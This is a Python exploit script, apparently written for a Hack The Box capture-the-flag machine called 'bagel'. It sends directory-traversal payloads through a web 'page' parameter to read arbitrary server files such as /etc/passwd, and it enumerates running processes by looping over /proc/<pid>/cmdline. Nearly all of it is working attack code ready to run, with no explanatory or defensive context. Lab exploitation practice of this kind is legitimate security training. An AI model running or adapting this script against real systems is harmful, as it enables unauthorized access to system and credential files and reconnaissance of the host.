#!/usr/bin/env python3
import requests, sys, argparse, codecs
from pwn import *

URL_BASE = "http://bagel.htb:8000/?page=../../../../../../../../"
proxies = { "http": "http://127.0.0.1:8080" }
proxies = {}

def usage() -> str:

  file = __file__.rsplit('/', 1)[1]

  usage = "\n"
  usage += f"{file} [-h] [--read] [--npid]"
  usage += f"\n"
  usage += f"\n[+] Read File \n\t{file} --read /etc/passwd"
  usage += f"\n"
  usage += f"\n[+] Enumerate Process \n\t{file} --npid 3000"
  usage += "\n"

  return usage


def init_argparse() -> argparse:

    parse = argparse.ArgumentParser(usage=usage())

    parse.add_argument('--read', dest='rfile', type=str, help='Full path of the file')
    parse.add_argument('--npid', dest='npid', type=int, help='Number of process (pids) to enumerate')

    return parse


def read_file(file:str, out:bool=False) -> None:	

	r = requests.get(URL_BASE + file,
					proxies=proxies)
	
	if not out:			
		print(f"[*] File: {file}\n")
		print(r.text)

	return r.text
	

def enum_process(pid) -> None:
	r = requests.session()
	p2 = log.progress(f"Fetching information")

	for i in range(0, pid):

		t = r.get(URL_BASE + f"proc/{i}/cmdline",
						timeout=10,
						proxies=proxies)

		p2.status("current pid " + str(i))

		if t.status_code != 500 and len(t.text) > 1 and t.text != "File not found":
			t = t.text
			print(f"\t[+] pid: {i}")
			print(f"\t[+] command: {t}")

	p2.success('done!')



if __name__ == "__main__":

	parse = init_argparse()	
	args = parse.parse_args()

	if args.rfile:
		read_file(args.rfile)
	elif args.npid:
		enum_process(args.npid)	
	else:
		parse.print_help()